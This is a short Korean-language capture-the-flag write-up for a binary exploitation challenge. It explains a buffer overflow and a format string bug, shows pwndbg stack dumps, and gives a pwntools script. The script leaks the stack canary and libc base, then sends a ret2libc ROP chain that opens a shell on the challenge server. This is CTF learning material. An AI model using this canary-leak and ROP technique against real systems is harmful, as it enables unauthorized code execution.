- 뱅가드에서 글자 수 제한 없이 입력받음 -> 버퍼오버플로우
- menu에서 printf() 오용 -> 포멧스트링 버그
- 아래 사진 정보들을 기반으로 익스함
- pie base로 푸는 방법도 있는 것 같은데 잘 몰라서 걍 libc base 구해서 풀었음


![[스크린샷 2024-04-09 050014.png]]

![[스크린샷 2024-04-09 050103.png]]

![[스크린샷 2024-04-09 050600.png]]

![[스크린샷 2024-04-09 050854.png]]

![[스크린샷 2024-04-09 051104.png]]

```
pwndbg> telescope rsp
00:0000│ rsp     0x7fffffffde40 ◂— 0x0
01:0008│-058     0x7fffffffde48 ◂— 0x0
02:0010│ rax rsi 0x7fffffffde50 —▸ 0x7ffff7fa4600 (_IO_file_jumps) ◂— 0x0
03:0018│-048     0x7fffffffde58 —▸ 0x7ffff7e175ad (_IO_file_setbuf+13) ◂— test rax, rax
04:0020│-040     0x7fffffffde60 —▸ 0x7ffff7fa86a0 (_IO_2_1_stderr_) ◂— 0xfbad2087
05:0028│-038     0x7fffffffde68 —▸ 0x7ffff7e0e6e5 (setvbuf+245) ◂— cmp rax, 1
06:0030│-030     0x7fffffffde70 ◂— 0x0
07:0038│-028     0x7fffffffde78 —▸ 0x7fffffffdea0 —▸ 0x7fffffffdeb0 ◂— 0x1
pwndbg> ni
...

pwndbg> telescope
00:0000│ rsp 0x7fffffffde40 ◂— 0x0
01:0008│-058 0x7fffffffde48 ◂— 0x0
02:0010│ rsi 0x7fffffffde50 ◂— 0x6664736166647361 ('asdfasdf')
03:0018│-048 0x7fffffffde58 —▸ 0x7ffff7e1750a (_IO_file_sync+218) ◂— mov rsi, qword ptr [rsp + 8]
04:0020│-040 0x7fffffffde60 —▸ 0x7ffff7fa86a0 (_IO_2_1_stderr_) ◂— 0xfbad2087
05:0028│-038 0x7fffffffde68 —▸ 0x7ffff7e0e6e5 (setvbuf+245) ◂— cmp rax, 1
06:0030│-030 0x7fffffffde70 ◂— 0x0
07:0038│-028 0x7fffffffde78 —▸ 0x7fffffffdea0 —▸ 0x7fffffffdeb0 ◂— 0x1
pwndbg>
```



```python
from pwn import *
import sys

if sys.argv[1] == "1":
    env = {"LD_PRELOAD": "./libc6_2.31-0ubuntu9.10_amd64.so"}
    p = process("./real_ez", env=env)
else:
    p = remote("ctf.hanbyul.me", 10013)

context.log_level = "debug"

p.sendline(b"%17$p%21$p")

p.recvuntil(b"0x")
canary = int(p.recvn(16), 16)

p.recvuntil(b"0x")
libc_base = int(p.recvn(12), 16) - 0x24083
print(libc_base)

p.sendlineafter(b"> ", b"7274")

payload = b"B" * 0x18
payload += p64(canary)
payload += p64(0xAAAAAAAA)
payload += p64(libc_base + 0x023B6A + 1)
payload += p64(libc_base + 0x023B6A)
payload += p64(libc_base + 0x1B45BD)
payload += p64(libc_base + 0x052290)

p.sendlineafter(b"titan :", payload)
p.interactive()

